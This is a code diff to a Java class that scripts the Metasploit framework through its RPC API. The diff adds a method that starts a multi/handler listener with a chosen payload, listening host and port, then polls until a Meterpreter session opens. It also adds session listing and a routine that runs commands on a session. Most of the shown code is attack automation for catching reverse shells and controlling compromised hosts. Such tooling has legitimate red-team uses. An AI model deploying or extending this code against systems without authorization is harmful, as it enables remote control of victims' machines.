@@ -25,20 +25,62 @@ public class BIL {
 
     public BIL() {
         msg = new MsgPackRpc();
-        api = new ApiController(token, msg);
+        api = new ApiController(msg);
     }
 
-    public void deviceSessionList() {
-
+    public JSONObject deviceSessionList() {
+        JSONObject resJson = api.getSessionList(token);
+        if (resJson.size() > 0) {
+            return resJson;
+        }
+        else{
+            return null;
+        }
     }
 
-    public void createHandler(String _host, String _lhost, String _lport, String _payload) {
-        Map params = new HashMap();
+    public String createHandler(String _lhost, String _lport, String _payload) throws InterruptedException {
+        String consoleID = api.consoleCreate(token);
+        if (!consoleID.isEmpty()) {
+            api.consoleWrite(consoleID, "use exploit/multi/handler\n",token);
+            Thread.sleep(500);
+            api.consoleWrite(consoleID, "set PAYLOAD " + _payload + "\n",token);
+            Thread.sleep(500);
+            api.consoleWrite(consoleID, "set LHOST "   + _lhost   + "\n",token);
+            Thread.sleep(500);
+            api.consoleWrite(consoleID, "set LPORT "   + _lport   + "\n",token);
+            Thread.sleep(500);
+            api.consoleWrite(consoleID, "show options\n",token);
+            Thread.sleep(500);
+            api.consoleWrite(consoleID, "exploit\n",token);
+            Thread.sleep(500);
+            
+            JSONObject readJson = api.consoleRead(consoleID,token);
+            // print in console log
+            System.out.println(readJson.get("data").toString());
+            
+            while (true) {
+                Thread.sleep(1000);
+                
+                readJson = api.consoleRead(consoleID, token);
+                if (readJson.get("data") != null) {
+                    String data = readJson.get("data").toString();
+
+                    if (!data.isEmpty() && data.contains("opened") && data.contains("[*] Meterpreter session")) {
+                        System.out.println(readJson.get("data").toString());
+                        return consoleID;
+                    }
+                }
+            }
+            
+        }
+
+       /* Map params = new HashMap();
         params.put("LHOST", _lhost);
         params.put("LPORT", _lport);
         params.put("PAYLOAD", _payload);
 
-        JSONObject job_id = api.moduleExecute("exploit", "exploit/handler", params);
+        JSONObject job_id = api.moduleExecute("exploit", "exploit/handler", params);*/
+        return null;
     }
 
     public JSONObject Login(String _host, int _port, String _userName, String _password) {
@@ -46,7 +88,6 @@ public class BIL {
         JSONObject login_Result_json = msg.rpcCall("auth.login", _userName, _password);
         return login_Result_json;
     }
-
     /**
      * target system information
      *
@@ -81,9 +122,9 @@ public class BIL {
         } else {
             throw new Exception("Error in execute command");
         }
-        
+
     }
-    
+
     public String meterpreter_FS_PWD(String SessionID) throws Exception {
 
         JSONObject Result_json = msg.rpcCall("session.meterpreter_run_single", token, SessionID, "pwd");
@@ -93,7 +134,7 @@ public class BIL {
         } else {
             throw new Exception("Error in execute command");
         }
-        
+
     }
 
     private JSONObject meterpreter_Read(String SessionID) {
